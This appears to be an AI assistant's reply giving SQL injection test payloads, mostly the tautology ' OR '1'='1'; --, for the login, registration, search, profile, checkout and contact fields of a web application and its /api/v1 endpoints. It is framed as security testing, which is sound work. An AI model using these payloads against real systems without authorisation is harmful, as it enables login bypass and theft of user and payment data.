Here are the SQL injection test payloads for each identified vulnerable input:

1. Login Form: 
   - Username field: ' OR '1'='1'; --
   - Password field: ' OR '1'='1'; --

2. Registration Form:
   - Email field: test' OR '1'='1'; --
   - Username field: test' OR '1'='1'; --
   - Password field: test' OR '1'='1'; --
   - Confirm Password field: test' OR '1'='1'; --

3. Search Bar:
   - Search input field: ' OR '1'='1'; --

4. User Profile:
   - First Name field: ' OR '1'='1'; --
   - Last Name field: ' OR '1'='1'; --
   - Email field: test' OR '1'='1'; --
   - Address field: ' OR '1'='1'; --

5. Checkout Page:
   - Credit Card Number field: 1234567890123456' OR '1'='1'; --
   - CVV field: 123' OR '1'='1'; --
   - Expiry Date field: 01/23' OR '1'='1'; --

6. Contact Us Form:
   - Name field: ' OR '1'='1'; --
   - Email field: test' OR '1'='1'; --
   - Message field: ' OR '1'='1'; --

API Endpoints:

1. /api/v1/login:
   - Parameters: username=test' OR '1'='1'; --, password=test' OR '1'='1'; --

2. /api/v1/register:
   - Parameters: email=test' OR '1'='1'; --, username=test' OR '1'='1'; --, password=test' OR '1'='1'; --, confirm_password=test' OR '1'='1'; --

3. /api/v1/search:
   - Parameters: query=' OR '1'='1'; --

4. /api/v1/user/profile:
   - Parameters: first_name=' OR '1'='1'; --, last_name=' OR '1'='1'; --, email=test' OR '1'='1'; --, address=' OR '1'='1'; --

5. /api/v1/checkout:
   - Parameters: card_number=1234567890123456' OR '1'='1'; --, cvv=123' OR '1'='1'; --, expiry_date=01/23' OR '1'='1'; --

6. /api/v1/contact:
   - Parameters: name=' OR '1'='1'; --, email=test' OR '1'='1'; --, message=' OR '1'='1'; --

These payloads can be used to test the security of the identified inputs and parameters against SQL injection attacks.